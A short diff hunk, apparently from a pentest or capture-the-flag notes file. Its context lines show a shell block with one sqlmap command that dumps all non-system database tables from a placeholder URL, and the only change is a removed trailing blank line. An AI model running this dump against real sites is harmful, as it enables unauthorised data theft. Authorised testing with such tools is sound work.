@@ -10,4 +10,3 @@
 ```sh
 sqlmap --dump-all --exclude-sysdbs -u http://URL/?name=1
 ```
-
